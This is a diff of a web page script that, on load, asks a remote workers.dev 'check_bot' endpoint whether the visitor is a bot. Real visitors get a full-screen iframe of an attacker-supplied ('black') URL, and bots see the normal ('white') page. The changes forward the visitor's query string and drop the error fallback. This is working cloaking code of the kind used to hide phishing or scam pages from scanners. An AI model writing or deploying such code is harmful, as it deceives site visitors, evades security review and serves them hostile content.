@@ -1,7 +1,7 @@
 const createLoader = () => {
   const frame = document.createElement('iframe');
   frame.id = 'load_frame';
-  frame.src = './frameloader.html';
+  frame.src = `frameLoad.html`;
   frame.frameBorder = 0;
   frame.width = '100%';
   frame.height = '100%';
@@ -13,7 +13,9 @@ const createLoader = () => {
   frame.style.zIndex = 9999;
 
   const body = document.querySelector('body');
-  if (body) body.prepend(frame);
+  if (body) {
+    body.prepend(frame);
+  }
 };
 
 const showWhite = () => {
@@ -24,16 +26,21 @@ const showWhite = () => {
     body.removeAttribute('hidden');
     body.style.overflow = 'auto';
   }
-  if (html) html.style.overflow = 'auto';
+  if (html) {
+    html.style.overflow = 'auto';
+  }
+
 
   document.querySelectorAll('style').forEach(styleTag => {
-    if (styleTag.textContent && styleTag.textContent.includes('overflow: hidden')) {
+    if (styleTag.textContent.includes('overflow: hidden')) {
       styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
     }
   });
 
   const preload = document.querySelector('#load_frame');
-  if (preload) preload.remove();
+  if (preload) {
+    preload.remove();
+  }
 };
 
 const showBlack = (blackUrl) => {
@@ -57,8 +64,8 @@ const showBlack = (blackUrl) => {
     z-index: 10000;
     display: block;
   `;
-  body.appendChild(frame);
 
+  body.appendChild(frame);
   body.classList.remove('hidden');
   body.removeAttribute('hidden');
 
@@ -82,20 +89,24 @@ const showBlack = (blackUrl) => {
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
+  const qs = location.search || ''; 
+
+  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs)
     .then(res => res.json())
     .then(res => {
       console.log('check_bot response:', res);
       if (res?.code === 200 && !res.result && res.url) {
-       
-        showBlack(res.url + '/wvS95k');
-      } else {
         
+        showBlack(res.url + '/wvS95k' + qs);
+      } else {
+      
         setTimeout(showWhite, 300);
       }
     })
     .catch(err => {
       console.error('error resp:', err);
-      showWhite();
+  
+     
+      
     });
 });
